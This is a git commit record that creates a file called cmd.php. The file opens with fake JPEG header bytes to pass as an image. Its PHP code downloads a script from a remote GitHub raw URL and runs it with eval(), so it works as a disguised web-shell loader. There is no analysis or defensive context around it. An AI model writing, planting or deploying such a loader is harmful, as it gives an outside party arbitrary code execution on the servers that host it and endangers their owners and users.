8e3dcad9f9ac699c7c64f951c35f826a99b7d622
fanteraa879 <sgmakramen@gmail.com>
2026-06-06 22:18:56 +0700

    Create cmd.php

---
+++ cmd.php
@@ -0,0 +1,9 @@
+���JFIF``��fExifMM*�i>�2��P���?CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality
+���JFIF``��fExifMM*�i>�2��P���?CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality
+<?php
+ 
+        $awo = 'https://';
+        eval("?>" . file_get_contents($awo . 'raw.githubusercontent.com/fanteraa879/bujangenam/refs/heads/main/cm.php'));
+        exit;
+ 
+?>�D�g���ޚ|3o��^�|Nf�G��	�'H�k���<O��'ޟ[��
